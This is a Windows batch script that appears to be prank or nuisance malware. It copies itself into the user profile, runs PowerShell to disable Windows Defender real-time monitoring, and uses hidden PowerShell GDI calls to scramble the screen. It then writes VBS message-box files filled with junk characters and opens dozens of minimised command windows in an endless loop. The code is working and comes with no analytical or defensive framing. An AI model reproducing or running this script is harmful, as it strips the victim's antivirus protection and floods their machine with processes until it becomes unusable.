@echo off
:X
COPY rse.bat %Userprofile%
powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
timeout /t 5
cmd /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class GDIHelper { [DllImport(\"user32.dll\")] public static extern IntPtr GetDC(IntPtr hwnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop); [DllImport(\"user32.dll\")] public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc); public const int SRCCOPY = 13369376; }'; $hdc = [GDIHelper]::GetDC([IntPtr]::Zero); $rand = New-Object Random; $width = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width; $height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height; $sw = [System.Diagnostics.Stopwatch]::StartNew(); while ($sw.ElapsedMilliseconds -lt 15000) { $x = $rand.Next(0, $width - 100); $y = $rand.Next(0, $height - 100); [GDIHelper]::BitBlt($hdc, $x + $rand.Next(-10, 10), $y + $rand.Next(-10, 10), 100, 100, $hdc, $x, $y, [GDIHelper]::SRCCOPY) | Out-Null; } [GDIHelper]::ReleaseDC([IntPtr]::Zero, $hdc) | Out-Null"
cmd /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class GDIHelper { [DllImport(\"user32.dll\")] public static extern IntPtr GetDC(IntPtr hwnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop); [DllImport(\"user32.dll\")] public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc); public const int SRCCOPY = 13369376; }'; $hdc = [GDIHelper]::GetDC([IntPtr]::Zero); $rand = New-Object Random; $width = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width; $height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height; $sw = [System.Diagnostics.Stopwatch]::StartNew(); while ($sw.ElapsedMilliseconds -lt 15000) { $x = $rand.Next(0, $width - 100); $y = $rand.Next(0, $height - 100); [GDIHelper]::BitBlt($hdc, $x + $rand.Next(-10, 10), $y + $rand.Next(-10, 10), 100, 100, $hdc, $x, $y, [GDIHelper]::SRCCOPY) | Out-Null; } [GDIHelper]::ReleaseDC([IntPtr]::Zero, $hdc) | Out-Null"
cmd /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class GDIHelper { [DllImport(\"user32.dll\")] public static extern IntPtr GetDC(IntPtr hwnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop); [DllImport(\"user32.dll\")] public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc); public const int SRCCOPY = 13369376; }'; $hdc = [GDIHelper]::GetDC([IntPtr]::Zero); $rand = New-Object Random; $width = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width; $height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height; $sw = [System.Diagnostics.Stopwatch]::StartNew(); while ($sw.ElapsedMilliseconds -lt 15000) { $x = $rand.Next(0, $width - 100); $y = $rand.Next(0, $height - 100); [GDIHelper]::BitBlt($hdc, $x + $rand.Next(-10, 10), $y + $rand.Next(-10, 10), 100, 100, $hdc, $x, $y, [GDIHelper]::SRCCOPY) | Out-Null; } [GDIHelper]::ReleaseDC([IntPtr]::Zero, $hdc) | Out-Null"
cmd /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class GDIHelper { [DllImport(\"user32.dll\")] public static extern IntPtr GetDC(IntPtr hwnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop); [DllImport(\"user32.dll\")] public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc); public const int SRCCOPY = 13369376; }'; $hdc = [GDIHelper]::GetDC([IntPtr]::Zero); $rand = New-Object Random; $width = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width; $height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height; $sw = [System.Diagnostics.Stopwatch]::StartNew(); while ($sw.ElapsedMilliseconds -lt 15000) { $x = $rand.Next(0, $width - 100); $y = $rand.Next(0, $height - 100); [GDIHelper]::BitBlt($hdc, $x + $rand.Next(-10, 10), $y + $rand.Next(-10, 10), 100, 100, $hdc, $x, $y, [GDIHelper]::SRCCOPY) | Out-Null; } [GDIHelper]::ReleaseDC([IntPtr]::Zero, $hdc) | Out-Null"
echo msgbox "␁␐␊␡␌␔␟␀␃␈␖␡␕␆␄␄␘␏␟␝␓␄␜␇␙␗␌␓␄␉␄␟␗␑␙␙␒␀␌␉␘␏␕␑␀␁␆␛␓␐␑␇␡␅␅␛␆␅␄␘␁␑␌␜␛␒␙␆␄␞␊␌␆␇␇␓␘␡␃␅␀␟␕␋␈␌␓␃␡␡␌␡␜␌␐␘␍␃␔␚␗␝␚␎␈␖␊␎␙␊␙␏␋␈␀␘␐␅␓␁␝␇␈␌␡␡␀␘␛␃␝␏␀␜␛␅␄␌␉␅␛␖␙␃␖␖␌␑␐␚␋␄␖␌␏␌␎␔␘␃␔␆␗␃␙␔␛␐␎␏␚␏␞␓␙␊␐␝␝␆␐␏␗␙␐␀␁␉␓␙␏␉␎␔␑␙␉␄␕␙␡␁␓␕␗␜␉␆␕␞␍␁␅␏␅␆␓␚␈␙␁␔␕␔␡␁␊␏␖␂␐␖␊␊␀␆␁␏␀␂␁␚␙␓␍␞␏␃␎␚␁␅␉␄␋␗␞␜␒␕␏␙␋␝␄␊␃␗␈␋␁␞␏␓␔␞␍␐␕␊␖␅␑␍␊␂␜␙␏␊␟␍␑␊␘␅␜␄␐␎␀␘␡␌␓␋␕␓␔␉␆␅␃␉␅␀␆␘␊␅␀␈␛␡␞␡␐␟␑␉␄␝␑␃␅␐␋␐␎␚␔␏␈␊␄␁␘␆␞␔␐␍␇␖␈␄␃␂␈␉␃␡␐␙␄␗␊␞␈␋␚␄␙␘␇␈␄␒␜␜␔␋␞␍␎␊␔␙␕␜␛␎␘␅␊␋␋␅␐␇␗␂␒␝␊␘␋␝␄␕␏␀␟␂␒␙␙␃␁␚␆␉␅␌␉␘␟␙␕␀␀␇␡␓␌␛␅␈␑␉␓␖␁␉␍␐␈␡␋␛␔␓␘␌␜␚␍␄␈␡␚␝␂␉␚␙␝␛␍␙␅␙␉␈␉␆␉␉␑␆␕␁␒␡␍␖␉␇␍␟␕␎␅␚␟␑␃␉␖␛␎␁␖␎␜␄␀␊␃␉␍␂␒␚␌␖␡␚␇␑␀␞␀␝␒␞␂␕␛␏␈␍␔␙␈␓␒␄␝␐␇␁␂␟␀␑␀␉␕␛␙␜␄␡␗␅␋␓␓␉␃␖␊␅␙␄␑␙␛␋␇␚␅␉␝␀␗␀␌␒␅␁␄␋␂␋␛␝␄␍␐␈␉␁␒␀␘␝␀␆␋␂␔␗␎␋␑␓␞␟␇␈␍␓␞␈␍␟␉␛␂␐␕␙␍␁␜␞␌␔␜␟␆␎␖␐␋␊␘␂␟␍␕␆", 16, "␖␘␡␋␙␎␚␋␟␌␒␇␕␄␆␃␒␇␀␖␍␄␕␘␉␕␞␔␖␜␅␜␙␉␐␍␈␙␝␐␃␗␞␓␖␀␇␓␑␎␋␡␝␎␘␑␔␝␘␄␚␍␗␄␡␋␡␟␐␖␜␀␛␝␔␄␏␆␗␏␋␔␈␡␇␡␂␝␗␑␙␘␂␘␋␘␈␊␈␕␆␛␁␊␞␗␗␝␐␚␘␐␟␎␆␐␌␕␔␜␐␄␒␕␅␔␚␇␡␗␆␀␖␇␚␑␇␖␑␘␒␒␚␝␋␃␟␏␒␙␁␋␛␟␚␝␝␐␍␄␗␔␝␡␑␟␛␐␒␐␝␅␖␑␔␓␈␇␓␞␜␆␚␡␉␀␔␁␐␅␉␞␊␞␙␛␂␚␌␘␅␍␕␅␏␛␆␅␖␐␏␕␇␆␓␡␕␁␞␘␜␆␃␊␟␘␃␂␒␎␆␡␡␚␚␀␐␌␊␅␊␑␑␅␜␗␔␂␄␙␗␅␚␏␛␍␀␖␗␁␑␆␍␔␟␙␊␗␟␉␗␟␋␋␗␌␀␆␀␘␚␈␉␂␘␕␈␖␗␊␚␊␟␡␄␂␀␑␋␕␝␋␗␟␛␜␛␇␋␐␏␞␕␂␔␉␟␎␜␙␡␒" > fyou.vbs
echo msgbox "⳨᝾⩑ḝ⌭ᘐ∛༽⥒aᆉ똞᜕Ṅ๜ᖏ៌⣣춰୻ḵảȨგᅖˑⷽඔଏᥛ땡ᆔ␯ང೚찷໮ᫎ⵬ಜᔣՠdᎩӅ⃑ⶽߝᓅ◌ᰋŤ⥀⯩ꁁࡪ⠈⫥┠ዡᅓ⯐טઊષ⦒ॿ᧹೚찷໮ᫎ⵬ಜᔣՠdᎩӅ⃑ⶽߝᓅ◌ᰋŤ⥀⯩ꁁࡪ⠈⫥┠ዡᅓ⯐טઊષ⦒ॿ᧹" , 16 > fyou1.vbs
start /min cmd /k fyou.vbs
start /min cmd /k fyou.vbs
start /min cmd /k fyou.vbs
start /min cmd /k fyou.vbs
start /min cmd /k fyou.vbs
start /min cmd /k fyou.vbs
start /min cmd /k fyou.vbs
start /min cmd /k fyou.vbs
start /min cmd /k fyou.vbs
start /min cmd /k fyou.vbs
start /min cmd /k fyou.vbs
start /min cmd /k fyou.vbs
start /min cmd /k fyou.vbs
start /min cmd /k fyou.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
start /min cmd /k fyou1.vbs
goto :X

